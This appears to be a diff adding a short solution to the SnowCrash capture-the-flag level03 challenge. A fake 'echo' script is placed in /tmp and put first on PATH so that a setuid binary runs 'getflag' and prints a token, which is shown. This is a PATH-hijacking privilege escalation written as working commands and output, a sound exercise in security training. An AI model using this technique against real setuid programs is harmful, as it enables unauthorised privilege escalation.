@@ -1,0 +1,8 @@
+echo "getflag" > /tmp/echo
+
+chmod +x /tmp/echo
+
+export PATH=/tmp:PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+
+level03@SnowCrash:~$ ./level03
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
